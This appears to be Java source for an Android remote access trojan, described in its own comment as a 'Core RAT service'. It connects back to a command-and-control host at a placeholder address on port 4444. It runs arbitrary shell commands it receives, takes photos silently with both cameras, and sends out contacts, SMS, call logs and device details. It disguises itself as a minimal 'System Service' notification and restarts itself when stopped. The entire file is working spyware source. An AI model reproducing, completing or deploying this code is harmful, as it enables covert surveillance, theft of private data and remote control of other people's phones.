package com.system.service;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.os.Build;
import android.os.IBinder;
import android.util.Log;

import java.io.BufferedReader;
import java.io.DataOutputStream;
import java.io.IOException;
import java.io.InputStreamReader;
import java.net.Socket;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

/**
 * Core RAT service.
 * Commands handled:
 *
 *   ping              → pong
 *   full_info         → all device info (HW, OS, SIM, contacts, SMS, calls, apps)
 *   photo_front       → silent front camera JPEG (Base64)
 *   photo_back        → silent back  camera JPEG (Base64)
 *   shell <cmd>       → execute shell command, return stdout+stderr
 *   notif_history     → not needed — NotifListener streams live
 *   die               → stop service (use sparingly)
 */
public class RatService extends Service {

    private static final String TAG        = "SystemService";
    static final         String C2_HOST    = "YOUR_C2_IP";   // ← replace
    static final         int    C2_PORT    = 4444;
    private static final String CHANNEL_ID = "sys_svc";

    private static final long BACKOFF_BASE = 5_000L;
    private static final long BACKOFF_MAX  = 120_000L;

    private final ExecutorService executor = Executors.newSingleThreadExecutor();
    private volatile boolean running = true;

    // ──────────────────────────────────────────────────────────────

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        promote_foreground();
        executor.submit(this::connection_loop);
        return START_STICKY;
    }

    @Override
    public void onDestroy() {
        running = false;
        executor.shutdownNow();
        C2Sender.set_writer(null);
        // Self-restart
        Intent i = new Intent(this, RatService.class);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) startForegroundService(i);
        else startService(i);
    }

    @Override
    public IBinder onBind(Intent intent) { return null; }

    // ──────────────────────────────────────────────────────────────

    private void connection_loop() {
        long backoff = BACKOFF_BASE;
        while (running) {
            try (Socket socket = new Socket(C2_HOST, C2_PORT)) {
                socket.setKeepAlive(true);
                socket.setSoTimeout(0);

                DataOutputStream writer =
                    new DataOutputStream(socket.getOutputStream());
                C2Sender.set_writer(writer); // wire shared sender

                backoff = BACKOFF_BASE;
                Log.d(TAG, "C2 connected");

                // Send initial device info automatically on connect
                C2Sender.send("[HELLO] " + Build.MODEL + " sdk=" + Build.VERSION.SDK_INT);

                command_loop(socket, writer);
            } catch (IOException e) {
                Log.d(TAG, "C2 disconnected: " + e.getMessage());
                C2Sender.set_writer(null);
            }
            if (!running) break;
            sleep(backoff);
            backoff = Math.min(backoff * 2, BACKOFF_MAX);
        }
    }

    private void command_loop(Socket socket, DataOutputStream writer) throws IOException {
        BufferedReader reader =
            new BufferedReader(new InputStreamReader(socket.getInputStream()));
        String line;
        while (running && (line = reader.readLine()) != null) {
            line = line.trim();
            if (line.isEmpty()) continue;
            dispatch(line);
        }
    }

    // ──────────────────────────────────────────────────────────────

    private void dispatch(String cmd) {
        try {
            // Commands that return via C2Sender (async ok)
            if (cmd.startsWith("shell ")) {
                String out = shell_exec(cmd.substring(6));
                C2Sender.send("[SHELL] " + out);
                return;
            }

            switch (cmd) {

                case "ping":
                    C2Sender.send("[PONG]");
                    break;

                case "full_info":
                    // Runs on executor to avoid blocking reader thread
                    new Thread(() -> {
                        String info = DeviceInfo.collect(getApplicationContext());
                        C2Sender.send(info);
                    }).start();
                    break;

                case "photo_front":
                    CameraModule.capture(getApplicationContext(), true,
                        bytes -> C2Sender.sendBytes("[IMG_FRONT]", bytes));
                    break;

                case "photo_back":
                    CameraModule.capture(getApplicationContext(), false,
                        bytes -> C2Sender.sendBytes("[IMG_BACK]", bytes));
                    break;

                case "die":
                    stopSelf();
                    break;

                default:
                    C2Sender.send("[UNKNOWN_CMD] " + cmd);
            }

        } catch (Exception e) {
            C2Sender.send("[ERROR] cmd=" + cmd + " err=" + e.getMessage());
        }
    }

    // ──────────────────────────────────────────────────────────────

    private String shell_exec(String command) throws IOException, InterruptedException {
        Process        proc   = Runtime.getRuntime().exec(new String[]{"sh", "-c", command});
        BufferedReader out    = new BufferedReader(new InputStreamReader(proc.getInputStream()));
        BufferedReader err    = new BufferedReader(new InputStreamReader(proc.getErrorStream()));
        StringBuilder  result = new StringBuilder();
        String line;
        while ((line = out.readLine()) != null) result.append(line).append('\n');
        while ((line = err.readLine()) != null) result.append("[err] ").append(line).append('\n');
        proc.waitFor();
        return result.length() > 0 ? result.toString().trim() : "[no output]";
    }

    private void promote_foreground() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel ch = new NotificationChannel(
                CHANNEL_ID, "System", NotificationManager.IMPORTANCE_MIN);
            ch.setShowBadge(false);
            ((NotificationManager) getSystemService(Context.NOTIFICATION_SERVICE))
                .createNotificationChannel(ch);
        }
        Notification note = new Notification.Builder(this, CHANNEL_ID)
            .setContentTitle("System Service")
            .setSmallIcon(android.R.drawable.stat_notify_sync)
            .setOngoing(true)
            .build();
        startForeground(1, note);
    }

    private void sleep(long ms) {
        try { Thread.sleep(ms); } catch (InterruptedException ignored) {}
    }
}
